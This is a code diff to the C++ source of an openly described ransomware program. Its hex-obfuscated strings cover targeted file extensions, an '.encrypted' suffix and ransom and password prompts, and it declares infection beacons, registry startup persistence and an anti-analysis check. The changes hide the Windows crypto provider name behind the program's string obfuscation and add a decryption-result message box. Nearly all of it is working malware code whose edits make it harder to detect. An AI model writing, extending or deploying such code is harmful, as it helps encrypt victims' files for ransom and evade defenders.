@@ -75,7 +75,8 @@ std::string strExtPptx = "87470707e2"; // .pptx
 std::string strExtPdf  = "664607e2";   // .pdf
 std::string strExtTxt  = "478747e2";   // .txt
 std::string strExtEncrypted = "46564707972736e656e2"; // .encrypted
-std::string strBanner = "128796274716d40256864702f6470256d6f636c65675"; // "Welcome to the Matrix!"
+std::string strBanner = "121257f69502371684028796274716d402568645"; // "The Matrix Has You!!"  // "128796274716d40256864702f6470256d6f636c65675"; // "Welcome to the Matrix!"
+std::string strBannerFree = "1212565627640257f69502475635028796274716d402568645"; // "The Matrix Set You Free!!"
 std::string strPasswordNeeded = "e25657e69647e6f63602f64702e6f6964707f60246f2025686470286479677024627f6773737160702160256469667f6270702473757d60257f695"; // "You must provide a password with the /d option to continue."
 std::string strPwdMessage = "02a34627f6773737160702568647024656275647e6560257f695"; // "You entered the password: "
 std::string strRecoveryFailed = "e24627f67737371607022757f697028647967702d6162776f627070256864702e6572756250202e2275667f636562702f647024656c6961666023756c6966602d5"; // "] files failed to recover.  Rerun the program with your password."
@@ -129,6 +130,7 @@ bool Decryptor(std::string fileToDecrypt, std::string fileRestored, std::string 
 void SendInfectionBeacon(DWORD dwEncryptedFileCount);
 void SendDecryptionBeacon(DWORD dwEncryptedFileCount);
 void RansomMessage(DWORD dwEncryptedFileCount);
+void FreedomMessage(DWORD dwEncryptedFileCount);
 bool AnalysisCheck();
 void SaveStartupPersistence();
 void DeleteStartupPersistence();
@@ -280,6 +282,9 @@ int main(int argc, char* argv[])
 
 			// Send network beacon to report ransom/decryption partially completed - machine is not fully cleaned
 			SendDecryptionBeacon(dwDecryptionResult);
+
+			// Display a decryption results message to the user
+			FreedomMessage(dwDecryptionResult);
 		}
 		else
 		{
@@ -289,6 +294,9 @@ int main(int argc, char* argv[])
 
 			// Send network beacon to report ransom/decryption completed - machine is successfully cleaned
 			SendDecryptionBeacon(dwDecryptionResult);
+
+			// Display a decryption results message to the user
+			FreedomMessage(dwDecryptionResult);
 		}
 	}
 }
@@ -329,8 +337,10 @@ void DecodeStrings()
 	HexToString(strExtPdf, strExtPdf);
 	HexToString(strExtTxt, strExtTxt);
 	HexToString(strExtEncrypted, strExtEncrypted);
+	HexToString(strCryptoProvider, strCryptoProvider);
 
 	HexToString(strBanner, strBanner);
+	HexToString(strBannerFree, strBannerFree);
 	HexToString(strPasswordNeeded, strPasswordNeeded);
 	HexToString(strPwdMessage, strPwdMessage);
 	HexToString(strRecoveryFailed, strRecoveryFailed);
@@ -683,6 +693,27 @@ void RansomMessage(DWORD dwEncryptedFileCount)
 	MessageBox(NULL, messageBoxText.c_str(), messageBoxCaption.c_str(), MB_OK);
 }
 
+void FreedomMessage(DWORD dwDecryptionResult)
+{
+	// Display a decryption results message to the user
+
+	if (dwDecryptionResult > 0)
+	{
+		// "Not All Your Files Are Belong To You!!! :<" 
+		strNotAllYourFilesAreBelongToYou.append("\n\n").append("[").append(std::to_string(dwDecryptionResult)).append(strRecoveryFailed);
+
+		std::wstring messageBoxCaption = StrToLpcwstr(strBanner);
+		std::wstring messageBoxText = StrToLpcwstr(strNotAllYourFilesAreBelongToYou);
+		MessageBox(NULL, messageBoxText.c_str(), messageBoxCaption.c_str(), MB_OK);
+	}
+	else
+	{
+		std::wstring messageBoxCaption = StrToLpcwstr(strBannerFree);
+		std::wstring messageBoxText = StrToLpcwstr(strAllYourFilesAreBelongToYou);
+		MessageBox(NULL, messageBoxText.c_str(), messageBoxCaption.c_str(), MB_OK);
+	}
+}
+
 void SaveStartupPersistence()
 {
 	// Save startup persistence data to the Registry
@@ -968,10 +999,13 @@ bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string k
 
 	DWORD dwStatus = 0;
 	BOOL bResult = FALSE;
-	wchar_t info[] = L"Microsoft Enhanced RSA and AES Cryptographic Provider";  // TODO: Fix this string for obfuscation
+	//wchar_t info[] = L"Microsoft Enhanced RSA and AES Cryptographic Provider";  // TODO: Fix this string for obfuscation
+	wchar_t* cryptProvider = new wchar_t[strCryptoProvider.length() + 1];
+	std::copy(strCryptoProvider.begin(), strCryptoProvider.end(), cryptProvider);
+	cryptProvider[strCryptoProvider.length()] = 0;
 	HCRYPTPROV hCryptProvider;
 
-	if (!CryptAcquireContextW(&hCryptProvider, NULL, info, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
+	if (!CryptAcquireContextW(&hCryptProvider, NULL, cryptProvider, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
 	{
 		dwStatus = GetLastError();
 #ifdef TRACEOUTPUT
@@ -1134,10 +1168,13 @@ bool Decryptor(std::string fileToDecrypt, std::string fileRestored, std::string 
 
 	DWORD dwStatus = 0;
 	BOOL bResult = FALSE;
-	wchar_t info[] = L"Microsoft Enhanced RSA and AES Cryptographic Provider";  // TODO: Fix this string for obfuscation
+	//wchar_t info[] = L"Microsoft Enhanced RSA and AES Cryptographic Provider";  // TODO: Fix this string for obfuscation
+	wchar_t* cryptProvider = new wchar_t[strCryptoProvider.length() + 1];
+	std::copy(strCryptoProvider.begin(), strCryptoProvider.end(), cryptProvider);
+	cryptProvider[strCryptoProvider.length()] = 0;
 	HCRYPTPROV hCryptProvider;
 
-	if (!CryptAcquireContextW(&hCryptProvider, NULL, info, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
+	if (!CryptAcquireContextW(&hCryptProvider, NULL, cryptProvider, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
 	{
 		dwStatus = GetLastError();
 #ifdef TRACEOUTPUT
